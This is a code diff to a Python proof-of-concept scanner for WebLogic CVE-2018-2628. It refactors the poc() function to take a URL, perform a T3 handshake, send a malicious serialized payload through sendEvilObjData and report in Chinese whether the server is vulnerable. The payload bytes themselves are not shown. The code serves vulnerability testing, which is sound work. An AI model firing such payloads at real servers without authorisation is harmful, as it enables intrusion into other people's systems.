@@ -64,19 +64,38 @@ def checkVul(res,server_addr,index):
         return False
 
 
-def poc(dip,dport,index):
+from urllib.parse import urlparse
+
+def poc(url, timeout=10):
+    index = 0
     try:
+        if not url.startswith('http'):
+            url = 'http://' + url
+        parsed = urlparse(url)
+        dip = parsed.hostname
+        dport = parsed.port
+        if not dport:
+             if parsed.scheme == 'https': dport = 443
+             else: dport = 80
+             # WebLogic usually runs on 7001, but if user provides url without port, we use default http ports
+             # unless we want to try 7001 if port 80 fails? 
+             # Let's stick to the port in URL or default http/https.
+        
+        if not dip:
+             dip = '127.0.0.1'
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-        sock.settimeout(3)
+        sock.settimeout(timeout)
         server_addr = (dip, dport)
         t3handshake(sock, server_addr)
         buildT3RequestObject(sock, dport)
         rs=sendEvilObjData(sock, PAYLOAD[index])
         # print(rs)
-        return checkVul(rs, server_addr, index)
-    except:
-        return False
+        if checkVul(rs, server_addr, index):
+            return True, 'WebLogic CVE-2018-2628: 存在漏洞'
+        return False, 'WebLogic CVE-2018-2628: 安全'
+    except Exception as e:
+        return False, f'WebLogic CVE-2018-2628: 扫描失败 - {str(e)}'
 
 
 if __name__=="__main__":
